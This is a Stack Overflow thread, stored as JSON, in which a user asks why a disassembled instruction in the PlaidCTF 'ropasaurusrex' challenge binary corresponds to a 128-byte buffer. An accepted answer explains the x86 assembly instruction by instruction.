1449653597, "post_id": 34174391, "comment_id": 56097214, "body": "@stackosiete: <code>0x80</code> is the hexadecimal representation of <code>128</code>."}], "answers": [{"tags": [], "owner": {"reputation": 39526, "user_id": 265804, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/156ef8708acdbf6a9ef76dad0d69609f?s=128&d=identicon&r=PG&f=1", "display_name": "Blagovest Buyukliev", "link": "https://stackoverflow.com/users/265804/blagovest-buyukliev"}, "is_accepted": true, "score": 4, "last_activity_date": 1449654197, "last_edit_date": 1449654197, "creation_date": 1449653252, "answer_id": 34175087, "question_id": 34174391, "link": "https://stackoverflow.com/questions/34174391/declaration-of-an-array-in-disassembled-code/34175087#34175087", "title": "Declaration of an array in disassembled code", "body": "<p>In general, there is no direct correspondence between individual assembly instructions and C constructs. A single instruction may be just a single \"brick\" from a larger construct. If optimisations are turned on, tracing things this way becomes even harder.</p>\n\n<p>Considering the first routine, here is an instruction-by-instruction walkthrough:</p>\n\n<ul>\n<li><p><code>push ebp</code> saves the old \"stack base pointer\" on the stack, so that it can restored after leaving the function and the caller can be confident that it hasn't changed;</p></li>\n<li><p><code>mov ebp, esp</code> loads the value of the \"base pointer\" with the current value of the \"stack pointer\". Any further references to variables within the stack frame of that function can be made relative to this newly assigned base pointer;</p></li>\n<li><p><code>sub esp, 0x98</code> subtracts the value <code>152</code> from the stack pointer. This effectively \"allocates\" space on the stack. Any variables with automatic storage can be now accommodated between the addresses pointed to by <code>ebp</code> and <code>esp</code>. This probably includes your <code>buffer</code> array.</p></li>\n<li><p><code>mov dword[ss:esp + 8], 0x100</code> puts the value <code>256</code> at the address pointed to by <code>esp + 8</code>. That might correspond to an assignment to an automatic variable/array.</p></li>\n<li><p><code>lea eax, dword[ss:ebp + var_88]</code> computes an address that is the result of the base pointer plus some constant offset, and stores it into <code>eax</code>. This probably corresponds to a pointer to the beginning of the automatic array.</p></li>\n<li><p><code>eax</code> is then moved to the stack as an argument to the following call to <code>j_read</code>. <code>0</code> is also passed as the first argument. The function is then called, the leave instruction restores the old base pointer and the control is returned to the caller via the <code>ret</code> instruction.</p></li>\n</ul>\n"}], "owner": {"reputation": 21, "user_id": 5176671, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/25b99babbca58ceb0871c3b0a65d676a?s=128&d=identicon&r=PG&f=1", "display_name": "stackosiete", "link": "https://stackoverflow.com/users/5176671/stackosiete"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 342, "favorite_count": 0, "accepted_answer_id": 34175087, "answer_count": 1, "score": 1, "last_activity_date": 1449677569, "creation_date": 1449651055, "last_edit_date": 1449677569, "question_id": 34174391, "link": "https://stackoverflow.com/questions/34174391/declaration-of-an-array-in-disassembled-code", "title": "Declaration of an array in disassembled code", "body": "<p>I try disassemble ropasaurusrex. this is CTF's Question.you can download Executable file from follow link. I use Hopper for disassemble.\n<a href=\"http://shell-storm.org/repo/CTF/PlaidCTF-2013/Pwnable/ropasaurusrex-200/ropasaurusrex-85a84f36f81e11f720b1cf5ea0d1fb0d5a603c0d\" rel=\"nofollow noreferrer\">here</a></p>\n\n<p><a href=\"https://i.stack.imgur.com/ykOWo.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/ykOWo.png\" alt=\"enter image description here\"></a></p>\n\n<p>The picture above is main routine of this program.</p>\n\n<p>Please look at red line on the above picture.</p>\n\n<p>It seems that declaration of the array is here.</p>\n\n<p><code>lea   eax, dword [ss:ebp+var_88]  =====&gt;  char buffer[128];</code></p>\n\n<p>Why? I can not understand 128bytes?</p>\n"}]